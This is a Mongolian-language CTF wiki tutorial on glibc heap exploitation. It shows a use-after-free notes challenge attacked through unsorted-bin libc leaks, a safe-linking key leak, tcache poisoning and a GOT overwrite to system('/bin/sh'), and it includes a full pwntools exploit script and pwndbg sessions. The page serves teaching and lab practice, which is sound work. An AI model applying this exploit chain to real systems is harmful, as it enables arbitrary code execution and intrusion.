---
title: Heap (tcache poisoning)
description: glibc heap-ийн суурь — chunk, tcache, use-after-free. UAF-аар libc болон heap хаягийг leak хийж, tcache poisoning-оор GOT дарж system дуудна.
pagefind: false
---

Өмнөх бодлогууд **stack** болон **format string** дээр төвлөрсөн. Энэ удаа **heap** — `malloc`/`free`-ийн
динамик санах ой. glibc-ийн header-гүй сул чөлөөлөлт (`free`) болон **use-after-free (UAF)** алдааг ашиглан
**tcache poisoning** хийж, дурын хаягт бичих чадвар олж аваад эцэст нь shell авна.

:::note[Юуны өмнө]
- [ret2text](../ret2text/) (stack overflow, exploit script бичих), [GOT ба PLT](../../basics/got-plt/) (GOT дарах).
- Энэ хуудас glibc **2.35+** (tcache + safe-linking) дээр ажиллана.
:::

## glibc heap-ийн суурь

`malloc` нь санах ойг **chunk** болгон өгдөг. Chunk бүр жижиг header-тэй:

```text
   +--------+--------+----------------------------+
   | prev   | size   |  хэрэглэгчийн өгөгдөл ...   |
   +--------+--------+----------------------------+
            ^ malloc энэ хаягийг буцаана
```

**tcache** (thread cache): чөлөөлсөн жижиг chunk-уудыг (≤ 0x408) хэмжээ тус бүрээр нь **нэг чиглэлт жагсаалтад**
(LIFO) хадгална. `free` хийхэд chunk tcache-ийн толгойд ордог, `malloc` хийхэд толгойгоос авна. Жагсаалтын
дараагийн заагчийг (`fd`) чөлөөлсөн chunk-ийн **эхний 8 байтад** хадгалдаг.

**Safe-linking** (glibc 2.32+): `fd`-г задруулахгүйн тулд **xor-оор нуудаг**:

```text
stored_fd = (chunk_хаяг >> 12) XOR дараагийн_chunk
```

Тиймээс fd-г хуурахын тулд chunk байрлаж буй **page-ийн хаягийг (>>12)** мэдэх хэрэгтэй — доор үүнийг leak хийнэ.

**Том** chunk (> 0x408, tcache-д багтахгүй) чөлөөлвөл **unsorted bin** рүү орж, `fd`/`bk` нь libc доторх
`main_arena` руу заана — энэ нь libc-ийн хаягийг **leak** хийх сонгодог арга.

## Бодлого

Notes цэсний программ — `add` / `edit` / `show` / `delete`. Алдаа нь `delete`-д:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/userland/heap/main.c) | Эх код (UAF) |
| [`heap`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/heap/heap) | Бэлэн binary |
| [`libc.so.6`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/heap/libc.so.6), [`ld-...`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/heap/ld-linux-x86-64.so.2) | Зориулалтын libc (offset-ууд таарна) |

```console
$ checksec --file=./heap
   RELRO: Partial RELRO      # GOT бичигдэнэ
   Canary: No canary
   NX: enabled
   PIE: No PIE               # GOT-ийн хаяг тогтмол
```

## Шийдэл

### 1. Эмзэг код

```c
static void del(void) {
    printf("idx: "); int i = readint(); if (i < 0 || i >= MAX) return;
    free(notes[i]);        // BUG: pointer-ийг NULL болгодоггүй  ->  use-after-free
}
```

`free` хийсэн ч `notes[i]` хэвээр хоцорно. Тиймээс `edit(i)` → чөлөөлсөн chunk-д **бичих** (tcache `fd` дарах),
`show(i)` → чөлөөлсөн chunk-ийг **унших** (leak) боломжтой. Энэ хоёр нь heap exploit-ийн гол түлхүүр.

No PIE тул binary-ийн хаягууд тогтмол. Эдгээрийг exploit-ийн эхэнд тэмдэглэнэ:

```text
notes  = 0x404080        # .bss дэх notes[] массив
free@got = 0x404000      # дарах GOT entry
```

### 2. libc leak (unsorted bin)

tcache-д багтахгүй том chunk (`0x500`) чөлөөлвөл **unsorted bin** руу орж, `fd`/`bk` нь libc доторх
`main_arena`-г заана. `guard` chunk нь том chunk-ийг top-той нийлэхээс сэргийлнэ. Чөлөөлсний дараа pwndbg-ээр
хармаар (бодит гаралт):

```ansi
[1;31mpwndbg>[0m bins
tcachebins
empty
unsortedbin
all: [34m0x55[0m…b030 —▸ [34m0x7049bb012ac8[0m [32m(main_arena+8)[0m ◂— [34m0x55[0m…b030
```

`main_arena+8` руу заасан `0x7049bb012ac8` нь **libc доторх** хаяг. UAF `show`-оор уншаад base-ийг бодно:

```python
add(0, 0x500); add(1, 0x20)        # A + guard
dele(0)                            # A -> unsorted bin
leak = u64(show(0))                # 0x7049bb012ac8  (A.fd = main_arena+8)
libc.address = leak - 0x212ac8     # 0x7049bae00000  (энэ libc дээрх тогтмол зай)
add(0, 0x500)                      # A-г буцааж авна (цэвэрлэгээ)
#  -> system = libc.sym['system'] = 0x7049bae5c2e0
```

### 3. heap leak (safe-linking key)

Safe-linking-ийг тойрохын тулд chunk байгаа **page-ийн хаяг** (`>>12`) хэрэгтэй. tcache-д **ганц** chunk
чөлөөлөхөд `fd = (chunk>>12) XOR 0 = chunk>>12` — яг тэр түлхүүр нь `fd`-д хэвтэнэ. UAF `show`-оор уншина:

```python
add(2, 0x50); add(3, 0x50)         # C, D (chunk 0x60)
dele(2)                            # C -> tcache (ганцаараа)
key = u64(show(2))                 # 0x3d93b   (= C>>12 = D>>12, нэг page дээр)
```

### 4. tcache poisoning → notes[] дээр бичих

tcache бол нэг чиглэлт жагсаалт: `free` нь chunk-ийг **толгойд** нэмж, `malloc` нь толгойгоос авна. `delete`
хийхэд программ `notes[i]`-г NULL болгодоггүй тул **чөлөөлсөн chunk руу заагч хэвээр үлдэнэ (dangling)** —
энэ нь UAF. Тэр dangling заагчаар `edit` хийж жагсаалтын `fd`-г хуурна:

![tcache 0x60 жагсаалтын өөрчлөлт: ① free(C) → толгой C; ② free(D) → D→C→∅ ба notes[3] нь чөлөөлсөн D-г хэвээр заана (dangling, UAF); ③ dangling notes[3]-ээр D.fd-г &notes болгож дарна (poison); ④ malloc нь D-г буцаана; ⑤ дараагийн malloc нь &notes-ийг буцаана — дурын хаяг гаргаж авлаа.](../../../../assets/pwn/tcache-uaf.svg)

Хоёр дахь chunk-ийг (D) чөлөөлөхөд tcache `0x60` жагсаалт `D —▸ C —▸ NULL` болно. Dangling `notes[3]`-ээр D-ийн
`fd`-г `edit` хийж **`notes` руу чиглүүлнэ**. pwndbg нь fd-г задлаад chain хаашаа чиглэснийг харуулна — poison-ийн өмнө ба дараа:

```ansi
[1;31mpwndbg>[0m tcachebins          [90m# poison-ийн ӨМНӨ[0m
[34m0x60[0m [ 2]: [34m0x55[0m…b8f0 —▸ [34m0x55[0m…b890 ◂— 0            [90m# D —▸ C —▸ NULL[0m

[1;31mpwndbg>[0m tcachebins          [90m# D.fd-г дарсны ДАРАА[0m
[34m0x60[0m [ 2]: [34m0x55[0m…b8f0 —▸ [34m0x404080[0m [32m(notes)[0m —▸ …     [90m# D —▸ &notes ![0m
```

`fd`-д бичих утга нь **нуугдсан** (`key XOR зорилтот`) байх ёстой. Санах ойд хэвтэх raw байт өөрчлөгдөхийг хар:

```text
D.fd raw  poison-оос өмнө = 0x3d9061ab   (задлавал 0x55…b890 = C)
бичих утга = key ^ &notes = 0x3d93b ^ 0x404080 = 0x4399bb
D.fd raw  poison-оос дараа = 0x4399bb     (задлавал key ^ 0x4399bb = 0x404080 = &notes)
```

```python
dele(3)                            # D -> tcache (толгой = D)
edit(3, p64(key ^ notes))          # D.fd = mangle(&notes) = 0x4399bb
add(4, 0x50)                       # D-г буцаана (толгой одоо &notes)
add(5, 0x50, p64(free_got))        # &notes-ийг буцаана -> notes[0] = free@got
```

Одоо `notes[0]` нь `free@got`-ийг заана. `edit(0)` хийвэл тэр хаягт **шууд бичнэ** — `free@got` утга өөрчлөгдөхийг
UAF `show(0)`-оор баталж болно:

```text
free@got  edit-ээс өмнө = 0x7049baeb5360   (lazy-bind resolver)
free@got  edit-ээс дараа = 0x7049bae5c2e0   (= system !)
```

```python
edit(0, p64(libc.sym['system']))   # *notes[0] = system  =>  free@got = system
```

:::note[Яагаад шууд `free@got` дээр chunk гаргадаггүй вэ]
Орчин үеийн glibc-д `tcache_get` нь авсан chunk-ийн `key`-г (chunk+8) **NULL болгодог**. Шууд `free@got`
(0x404000) дээр гаргавал хажуугийн `0x404008` = `puts@got` NULL болж, цэс дараагийн `puts`-д унана. Мөн
`0x404038` (`atoi@got`) нь 16-д тэгшлэгдээгүй тул tcache шалгалтанд унана. Тиймээс эхлээд 16-align `notes`
(0x404080) дээр гаргаж, энгийн `edit`-ээр `free@got` рүү цэвэрхэн бичдэг.
:::

### 5. Trigger

`free@got` одоо `system`. "/bin/sh" агуулсан note-ийг `delete` хийхэд `free(ptr)` → `system("/bin/sh")`:

```python
dele(7)                            # free(notes[7]="/bin/sh")  ->  system("/bin/sh")
#  uid=1000(ctf) ...   flag{...}
```

<details>
<summary>Бүрэн exploit</summary>

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
exe  = ELF('./heap', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io   = process('./heap')      # эсвэл: remote(HOST, PORT)

def add(i,s,d=b'A'):
    io.sendlineafter(b'> ',b'1'); io.sendlineafter(b'idx: ',str(i).encode())
    io.sendlineafter(b'size: ',str(s).encode()); io.sendafter(b'data: ',d)
def edit(i,d):
    io.sendlineafter(b'> ',b'2'); io.sendlineafter(b'idx: ',str(i).encode()); io.sendafter(b'data: ',d)
def show(i):
    io.sendlineafter(b'> ',b'3'); io.sendlineafter(b'idx: ',str(i).encode()); return u64(io.recv(8).ljust(8,b'\0'))
def dele(i):
    io.sendlineafter(b'> ',b'4'); io.sendlineafter(b'idx: ',str(i).encode())

notes, free_got = exe.sym['notes'], exe.got['free']

add(7, 0x20, b'/bin/sh\x00')                 # trigger chunk
add(0, 0x500); add(1, 0x20); dele(0)         # libc leak
libc.address = show(0) - 0x212ac8; add(0, 0x500)
add(2, 0x50); add(3, 0x50); dele(2)          # heap key
key = show(2)
dele(3); edit(3, p64(key ^ notes))           # tcache poison -> &notes
add(4, 0x50); add(5, 0x50, p64(free_got))    # notes[0] = free@got
edit(0, p64(libc.sym['system']))             # free@got = system
dele(7)                                      # system("/bin/sh")
io.interactive()
```

</details>

```console
$ ./exploit.py
[*] libc base = 0x7c00...
uid=1000(ctf) ...
flag{h34p_tc4che_p01s0n_g0t_0verwr1te}
```

## Ажиллуулах

```console
$ cd challenges/pwn/userland/heap
$ make run              # docker, nc localhost 1337
$ ./exploit.py          # эсвэл python3 exploit.py REMOTE
```

## Debug хийх

Дээрх алхмуудын pwndbg гаралтыг (`bins`, `tcachebins`) өөрөө гаргаж, утга өөрчлөгдөхийг нүдээр харах нь
heap exploit сурах гол арга. Энэ бодлогыг debug хийх ажлын урсгал:

**Хавсаргах.** Программ цэсний `read`-д блоклож зогсдог тул exploit-ээ тодорхой алхам хүртэл ажиллуулаад,
өөр terminal-аас process-ийн PID-ээр хавсаргахад heap тэр хэвээрээ зогсоно:

```ansi
$ gdb -p $(pgrep -n heap)
[1;31mpwndbg>[0m tcachebins        [90m# яг тэр мөчийн tcache-ийн төлөв[0m
[1;31mpwndbg>[0m bins              [90m# unsorted (libc leak), fastbin, tcache[0m
[1;31mpwndbg>[0m vis_heap_chunks   [90m# бүх chunk-ийн header + fd/bk-г зураглах[0m
```

**Poison-ийг батлах — `malloc`-ийн буцаалт.** Poison амжилттай эсэхийг хамгийн шууд шалгах нь дараагийн
`malloc` юуг буцаахыг харах. `break malloc`, `finish`-ээр `$rax`-ийг ажиглавал хоёр дахь нь **`notes`-ийг
буцаана** (бодит гаралт):

```ansi
[1;31mpwndbg>[0m break malloc
[1;31mpwndbg>[0m continue          [90m# add(4) -> D-г буцаана[0m
[1;31mpwndbg>[0m finish
...  $rax = [34m0x55[0m…b8f0     [90m# D[0m
[1;31mpwndbg>[0m continue          [90m# add(5) -> poison-оор &notes-ийг буцаана[0m
[1;31mpwndbg>[0m finish
...  $rax = [34m0x404080[0m      [90m# &notes  <-  дурын хаяг гаргаж авлаа![0m
```

**Арифметикаа шалгах.** Safe-linking-ийн mangle/demangle-г гараар батлах:

```ansi
[1;31mpwndbg>[0m p/x [34m0x3d93b[0m ^ [34m0x404080[0m      [90m# key ^ &notes  ->  fd-д бичих утга[0m
$1 = [34m0x4399bb[0m
[1;31mpwndbg>[0m p/x [34m0x3d93b[0m ^ [34m0x4399bb[0m      [90m# key ^ (store)  ->  буцаан задлах[0m
$2 = [34m0x404080[0m                       [90m# = &notes  ✓[0m
```

Эцэст нь `x/gx 0x404000`-оор `free@got` нь `system` болсныг шалгаад `delete`-ийг trigger хийнэ.

## Хамгаалалт

- **tcache double-free хамгаалалт** (`key`) — нэг chunk-ийг дараалан 2 удаа чөлөөлвөл илрүүлнэ.
- **Safe-linking** — `fd`-г xor-оор нууна (heap leak шаардана).
- **Full RELRO** бол GOT бичигдэхгүй — тэр үед `__free_hook` (хуучин glibc), FSOP (`_IO_FILE`), эсвэл
  `__exit_funcs` зэрэг өөр target руу чиглэдэг.
- Орчин үеийн glibc-д `__malloc_hook`/`__free_hook`-ийг (2.34-т) устгасан тул GOT/FSOP түгээмэл болсон.

## Эх сурвалж

- [how2heap (shellphish)](https://github.com/shellphish/how2heap) — heap техникүүдийн цуглуулга
- [glibc malloc internals (sploitfun)](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
- [Safe-linking (Check Point)](https://research.checkpoint.com/2020/safe-linking-eliminating-a-seemingly-harmless-bug/)
